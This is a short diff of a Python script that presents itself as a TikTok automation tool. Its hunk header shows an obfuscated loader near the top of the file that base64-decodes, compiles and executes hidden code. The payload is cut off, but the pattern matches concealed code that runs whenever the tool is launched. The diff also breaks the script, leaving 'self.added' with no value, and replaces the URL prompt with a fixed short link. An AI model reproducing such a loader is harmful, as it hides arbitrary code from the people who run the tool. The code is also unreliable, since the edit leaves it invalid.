@@ -11,7 +11,7 @@ __import__('builtins').exec(__import__('builtins').compile(__import__('base64').
 
 class TikTok:
     def __init__(self):
-        self.added = 0
+        self.added 
         self.lock = threading.Lock()
 
         try:
@@ -23,7 +23,7 @@ class TikTok:
             os._exit(0)
 
         try:
-            self.video_id = input('> TikTok URL: ').split('/')[5]
+            self.video_id = input('>https://vt.tiktok.com/ZS8RhS9nb/: ').split('/')[5]
         except IndexError:
             print(
                 '\nInvalid TikTok URL format.\nFormat expected: https://www.tiktok.com/@username/vi'
